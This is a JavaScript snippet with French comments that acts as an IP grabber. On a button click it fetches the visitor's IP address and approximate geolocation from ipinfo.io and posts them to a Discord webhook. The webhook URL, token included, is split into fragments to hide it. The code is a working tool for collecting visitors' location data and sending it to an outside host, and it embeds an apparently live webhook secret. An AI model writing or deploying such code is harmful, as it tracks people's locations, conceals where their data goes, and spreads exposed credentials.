document.getElementById('get-info-btn').addEventListener('click', function() {
    // Fonction pour obtenir l'URL du webhook Discord
    function getWebhookUrl() {
        // Remplacez les parties par les segments de votre URL de webhook Discord
        let part1 = 'https://dis';
        let part2 = 'cord.co';
        let part3 = 'm/api/we';
        let part4 = 'bhooks';
        let part5 = '12436525502';
        let part6 = '51515914/SrRtaX';
        let part7 = '_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImf';
        let part8 = 'e-XgBBlDcT6r_00VU';
        return `${part1}${part2}${part3}${part4}/${part5}${part6}${part7}${part8}`;
    }

    fetch('https://ipinfo.io') // Utilisation de l'API ipinfo.io
        .then(response => {
            if (!response.ok) {
                throw new Error('Erreur HTTP, statut : ' + response.status);
            }
            return response.json();
        })
        .then(data => {
            if (data) {
                let ipAddress = data.ip; // L'adresse IP au format IPv4

                let message = {
                    content: `
                        **Utilisateur a cliqué sur le bouton**
                        \nL'adresse IP est : ${ipAddress}
                        \nLocalisation approximative :
                        \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country}
                        \n[Google Maps](https://www.google.com/maps?q=${data.loc})
                    `
                };

                let webhookUrl = getWebhookUrl();

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                }).then(response => {
                    if (response.ok) {
                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
                    } else {
                        throw new Error('Erreur lors de l\'envoi au webhook Discord, statut : ' + response.status);
                    }
                }).catch(error => {
                    console.error('Erreur lors de l\'envoi au webhook Discord:', error);
                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                });

                document.getElementById('info-display').innerText = `
                    L'adresse IP est : ${ipAddress}
                    \nLocalisation approximative :
                    \nVille : ${data.city}, Région : ${data.region}, Pays : ${data.country}
                    \n[Google Maps](https://www.google.com/maps?q=${data.loc})
                `;
            } else {
                throw new Error('Erreur : Aucune donnée retournée par l\'API.');
            }
        })
        .catch(error => {
            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations : ' + error.message;
            console.error('Erreur lors de la récupération des informations :', error);
        });
});
